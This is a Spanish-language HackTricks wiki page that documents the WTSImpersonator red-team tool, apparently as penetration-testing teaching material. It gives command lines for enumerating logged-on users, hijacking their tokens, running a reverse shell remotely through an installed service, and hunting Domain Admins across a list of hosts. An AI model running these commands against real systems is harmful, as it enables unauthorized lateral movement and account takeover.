{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

La herramienta **WTS Impersonator** explota el **"\\pipe\LSM_API_service"** RPC Named pipe para enumerar sigilosamente a los usuarios conectados y secuestrar sus tokens, eludiendo las técnicas tradicionales de suplantación de tokens. Este enfoque facilita movimientos laterales sin problemas dentro de las redes. La innovación detrás de esta técnica se atribuye a **Omri Baso, cuyo trabajo es accesible en [GitHub](https://github.com/OmriBaso/WTSImpersonator)**.

### Funcionalidad Principal
La herramienta opera a través de una secuencia de llamadas a la API:
```powershell
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```
### Módulos Clave y Uso
- **Enumerando Usuarios**: La enumeración de usuarios locales y remotos es posible con la herramienta, utilizando comandos para cada escenario:
- Localmente:
```powershell
.\WTSImpersonator.exe -m enum
```
- Remotamente, especificando una dirección IP o nombre de host:
```powershell
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```

- **Ejecutando Comandos**: Los módulos `exec` y `exec-remote` requieren un contexto de **Servicio** para funcionar. La ejecución local simplemente necesita el ejecutable WTSImpersonator y un comando:
- Ejemplo para la ejecución de comandos local:
```powershell
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
- PsExec64.exe se puede usar para obtener un contexto de servicio:
```powershell
.\PsExec64.exe -accepteula -s cmd.exe
```

- **Ejecución Remota de Comandos**: Implica crear e instalar un servicio de forma remota similar a PsExec.exe, permitiendo la ejecución con los permisos apropiados.
- Ejemplo de ejecución remota:
```powershell
.\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```

- **Módulo de Caza de Usuarios**: Apunta a usuarios específicos en múltiples máquinas, ejecutando código bajo sus credenciales. Esto es especialmente útil para apuntar a Administradores de Dominio con derechos de administrador local en varios sistemas.
- Ejemplo de uso:
```powershell
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```


{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripción**](https://github.com/sponsors/carlospolop)!
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>
{% endhint %}
